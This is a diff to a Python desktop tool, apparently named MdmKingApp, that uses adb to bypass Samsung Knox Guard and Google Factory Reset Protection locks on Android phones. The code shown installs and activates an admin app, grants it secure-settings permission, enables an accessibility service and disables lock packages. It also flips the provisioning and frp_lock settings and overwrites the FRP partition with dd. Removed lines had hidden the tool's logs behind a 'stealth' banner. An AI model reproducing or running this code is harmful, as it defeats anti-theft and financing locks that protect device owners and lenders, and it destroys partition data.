@@ -6334,42 +6334,31 @@ class MdmKingApp:
             except Exception: return ''
         # ── Display device info ──
         self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
-        self.log('Device:', 'h')
-        self.log(f'Model:                {g("ro.product.model")}', 's')
-        self.log(f'Device:               {g("ro.product.device")}', 'i')
-        self.log(f'Platform:             {g("ro.board.platform", "ro.chipname")}', 'i')
-        self.log(f'Android:              {g("ro.build.version.release")}', 'i')
-        self.log(f'Security:             {g("ro.build.version.security_patch")}', 'i')
-        self.log(f'CSC:                  {g("ro.csc.sales_code")}', 'i')
-        self.log(f'Serial:               {g("ro.serialno", "sys.serialnumber")}', 'i')
+        self._fl_hdr('Device Connected:')
+        self._fl_done('Check Device State:........OK')
+        self._fl_val(f'Model:{g("ro.product.model")}')
+        self._fl_blue(f'Device:{g("ro.product.device")}')
+        self._fl_yellow(f'Platform:{g("ro.board.platform", "ro.chipname")}')
+        self._fl_pink(f'Android:{g("ro.build.version.release")}')
+        self._fl_purple(f'Security:{g("ro.build.version.security_patch")}')
+        self._fl_val(f'CSC:{g("ro.csc.sales_code")}')
+        self._fl_blue(f'Serial:{g("ro.serialno", "sys.serialnumber")}')
         bl_val = g("ro.boot.bootloader")
-        if bl_val: self.log(f'Bootloader:           {bl_val}', 'i')
+        if bl_val: self._fl_yellow(f'Bootloader:{bl_val}')
         imei1 = g("ro.ril.miui.imei", "persist.radio.imei", "ro.telephony.imei", "gsm.imei", "ril.IMEI1", "ril.IMEI", "vendor.ril.imei", "ro.ril.oem.imei1", "ro.ril.oem.imei")
         def _valid_imei(s): return s and s.isdigit() and len(s) == 15 and s[:2] in ('35', '01', '86', '00')
-        if _valid_imei(imei1): self.log(f'IMEI1:                {imei1}', 'i')
+        if _valid_imei(imei1): self._fl_pink(f'IMEI1:{imei1}')
         imei2 = g("ro.ril.miui.imei2", "persist.radio.imei2", "ro.telephony.imei2", "gsm.imei2", "ril.IMEI2", "vendor.ril.imei2", "ro.ril.oem.imei2")
-        if _valid_imei(imei2): self.log(f'IMEI2:                {imei2}', 'i')
+        if _valid_imei(imei2): self._fl_purple(f'IMEI2:{imei2}')
         kg_raw = g("ro.boot.kgstatus") or g("gsm.KG") or g("persist.sys.kg") or g("ril.kgstatus") or g("ro.boot.kg") or ''
         kg_map = {'0x0':'prenormal', '0x1':'checking', '0x2':'completed', '0x3':'normal',
                   '0x4':'locked', '0x5':'allzero', '0x6':'broken', '0x7':'checking'}
         kg_display = kg_map.get(kg_raw.lower(), kg_raw) if kg_raw else 'unknown'
-        self.log(f'KG State:             {kg_display}', 'w' if kg_display in ('broken','locked') else 'i')
-        self.log_blank()
+        self._fl_val(f'KG State:{kg_display}')
+        self._fl('')
         self._enqueue_ui(lambda: self.root.update())
-
-        # ── Show banner and suppress all intermediate logs ──
-        def _show_banner():
-            self.log_text.insert(tk.END, 'SAMSUNG ONECLICK IS BYPASS!\n', 'h')
-            self.log_text.insert(tk.END, 'Please Wait!\n', 'i')
-            self.log_text.see(tk.END)
-        self.root.after(0, _show_banner)
-        time.sleep(0.2)
-        _saved_log_real = self._log_impl
-        _saved_log_fmt_real = self._log_formatted_impl
-        def _silent(msg, tag=None): pass
-        def _silent_fmt(parts): pass
-        self._log_impl = _silent
-        self._log_formatted_impl = _silent_fmt
+        self._fl_hdr('SAMSUNG ONECLICK BYPASS')
+        self._fl_warn('Processing — DO NOT DISCONNECT')
 
         # KG state reading
         kg_map = {'0x0':'prenormal', '0x1':'checking', '0x2':'completed', '0x3':'normal',
@@ -6406,30 +6395,7 @@ class MdmKingApp:
                 _f.write(f'[{datetime.datetime.now().isoformat()}] KG={current_kg or "unknown"} | {" ".join(_kg_dbg)}\n')
         except Exception: pass
 
-        # ── Phase 2: Stealth bypass ──
-        self._log_buffer = []
-        self._saved_log_impl = self._log_impl
-        self._saved_log_formatted_impl = self._log_formatted_impl
-        def _buf(msg, tag=None): self._log_buffer.append((msg, tag))
-        def _buf_fmt(parts): self._log_buffer.append((''.join(t for t,_ in parts), None))
-        self._log_impl = _buf
-        self._log_formatted_impl = _buf_fmt
-        self._magic_text = ''
-        self._enqueue_ui(lambda: self.log_text.insert(tk.END, self._magic_text))
-        self._enqueue_ui(lambda: self.log_text.see(tk.END))
-        self._enqueue_ui(lambda: self.root.update())
-        self._magic_anim_running = True
-        self._magic_dots = 0
-        def _anim_loop():
-            while self._magic_anim_running:
-                self._magic_dots = (self._magic_dots + 1) % 4
-                dots = '.' * self._magic_dots
-                self._enqueue_ui(lambda d=dots: (
-                    self.log_text.delete('end-1l linestart', 'end-1l lineend'),
-                    self.log_text.insert('end-1l linestart', f'{self._magic_text}{d}')))
-                time.sleep(0.5)
-        t = threading.Thread(target=_anim_loop, daemon=True)
-        t.start()
+        # ── Phase 2: Stealth bypass (real-time logging) ──
         try:
             tools = self._tools_dir()
             apk = None
@@ -6526,7 +6492,6 @@ class MdmKingApp:
                     err = po_out.strip().split('\n')[0][:80] if po_out else 'failed'
                     self.log(f'Admin activate: {err}', 'o')
             subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.MainActivity --activity-clear-top'], timeout=5, capture_output=True, creationflags=flags)
-            time.sleep(3)
             subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.DisableFactoryReset --activity-clear-top 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
@@ -6579,20 +6544,8 @@ class MdmKingApp:
             time.sleep(3)
             r = subprocess.run([adb, '-s', s, 'shell', 'settings get secure enabled_accessibility_services'], capture_output=True, text=True, timeout=5, creationflags=flags)
             if 'MyAccessibilityService' in r.stdout: self.log_ok('HyperCore protection active - device secured')
-            else: self.log_warn('Protection layer incomplete - manual check advised')
+            else: self._fl_warn('Protection layer incomplete - manual check advised')
             subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 1 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
-            self._magic_text = ''
-        finally:
-            self._magic_anim_running = False
-            self._log_impl = self._saved_log_impl
-            self._log_formatted_impl = self._saved_log_formatted_impl
-            buf = list(self._log_buffer)
-            self._log_buffer.clear()
-            self._enqueue_ui(lambda b=buf: (
-                [self.log_text.insert(tk.END, f'[{t}] {m}\n' if t else m + '\n') for m, t in b],
-                self.log_text.see(tk.END),
-                self.root.update(),
-                self.log_text.insert(tk.END, '\n')))
             # Disable all known lock packages for Samsung + common
             for pkg in CHIPSET_PACKAGES['samsung'] + CHIPSET_PACKAGES['common']:
                 subprocess.run([adb, '-s', s, 'shell', f'pm disable-user --user 0 {pkg} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
@@ -6748,15 +6701,12 @@ class MdmKingApp:
             self.log('  KG client removed, status set to checking', 's')
             # Apply relock prevention
             self._samsung_hardening()
-            # Restore logger and show completion
-            self._log_impl = _saved_log_real
-            self._log_formatted_impl = _saved_log_fmt_real
-            def _show_done():
-                self.log_text.insert(tk.END, 'Bypass Complete!\n', 's')
-                self.log_text.insert(tk.END, 'disable airplane mode and connect online\n', '')
-                self.log_text.insert(tk.END, 'If device still locked, run bypass again\n', 'w')
-                self.log_text.see(tk.END)
-            self.root.after(0, _show_done)
+            # Show completion
+            self._fl_done('Bypass Complete!')
+            self._fl_muted('disable airplane mode and connect online')
+            self._fl_warn('If device still locked, run bypass again')
+        except Exception as _e:
+            self._fl_fail(f'Bypass error: {_e}')
 
     def _samsung_hardening(self):
         if not self._ensure_active(): return
@@ -8560,7 +8510,6 @@ class MdmKingApp:
         devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
         if not devs: self.log('No device', 'e'); return
         s = devs[0]; flags = 0x08000000
-        self.log('Reading device info...', 'i')
         raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=10, creationflags=flags).stdout
         p = {}
         for line in raw.split('\n'):
@@ -8575,9 +8524,13 @@ class MdmKingApp:
                 except Exception: pass
                 if v: p[k] = v; return v
             return ''
-        hw = [('📱', 'Model', g("ro.product.model")), ('ðŸ­', 'Brand', g("ro.product.brand")), ('📱', 'Android', g("ro.build.version.release"))]
-        pass
-        self.log('Bypassing FRP lock...', 'i')
+        self._fl_hdr('Device Connected:')
+        self._fl_val(f'Model:{g("ro.product.model")}')
+        self._fl_blue(f'Brand:{g("ro.product.brand")}')
+        self._fl_yellow(f'Android:{g("ro.build.version.release")}')
+        self._fl('')
+        self._fl_hdr('FRP BYPASS')
+        self._fl_warn('Processing — DO NOT DISCONNECT')
         subprocess.run([adb, '-s', s, 'shell', 'settings put global device_provisioned 1'], timeout=5, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'settings put secure user_setup_complete 1'], timeout=5, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'settings put global development_settings_enabled 1'], timeout=5, creationflags=flags)
@@ -8591,9 +8544,8 @@ class MdmKingApp:
         subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.android.vending 2>/dev/null'], timeout=5, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'content insert --uri content://settings/secure --bind name:s:skip_first_use_hint --bind value:s:1 2>/dev/null'], timeout=3, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'content insert --uri content://settings/secure --bind name:s:frp_lock --bind value:s:0 2>/dev/null'], timeout=3, creationflags=flags)
-        # Erase FRP partition if writable
         subprocess.run([adb, '-s', s, 'shell', 'dd if=/dev/zero of=/dev/block/by-name/frp bs=1024 count=8 2>/dev/null'], timeout=5, creationflags=flags)
-        self.log_ok('FRP bypass complete — reboot device')
+        self._fl_done('FRP bypass complete — reboot device')
 
     def _adb_factory_reset(self):
         self.log_section('ADB Factory Reset', 2)
@@ -8607,17 +8559,35 @@ class MdmKingApp:
             if os.path.isfile(p): adb = p; break
         r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
         devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
-        if not devs: self.log('No device', 'e'); return
+        if not devs: self._fl_fail('No device found'); return
         s = devs[0]
-        self.log('WARNING: This will wipe all device data!', 'e')
-        self.log('Starting factory reset...', 'i')
+        self._fl_hdr('ADB FACTORY RESET')
+        self._fl_warn('WARNING: This will wipe all device data!')
+        raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=10, creationflags=flags).stdout
+        p = {}
+        for line in raw.split('\n'):
+            if ']: [' in line:
+                k, v = line.strip()[1:].split(']: [', 1)
+                p[k] = v.rstrip(']')
+        def g(*keys):
+            for k in keys:
+                v = p.get(k, '')
+                if v: return v
+                try: v = subprocess.run([adb, '-s', s, 'shell', f'getprop {k}'], capture_output=True, text=True, timeout=3).stdout.strip()
+                except Exception: pass
+                if v: p[k] = v; return v
+            return ''
+        self._fl_val(f'Model:{g("ro.product.model")}')
+        self._fl_blue(f'Brand:{g("ro.product.brand")}')
+        self._fl_yellow(f'Android:{g("ro.build.version.release")}')
+        self._fl('')
         subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a android.intent.action.MASTER_CLEAR 2>/dev/null'], timeout=5, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a android.intent.action.FACTORY_RESET 2>/dev/null'], timeout=5, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'settings put global device_provisioned 0 2>/dev/null'], timeout=3, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'settings put secure user_setup_complete 0 2>/dev/null'], timeout=3, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'svc wifi disable && svc data disable'], timeout=3, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'reboot recovery'], timeout=30, creationflags=flags)
-        self.log('Factory reset sent — device rebooting to recovery', 's')
+        self._fl_done('Factory reset sent — device rebooting to recovery')
 
     def _adb_read_info(self):
         adb = os.path.join(self._tools_dir(), 'adb.exe')
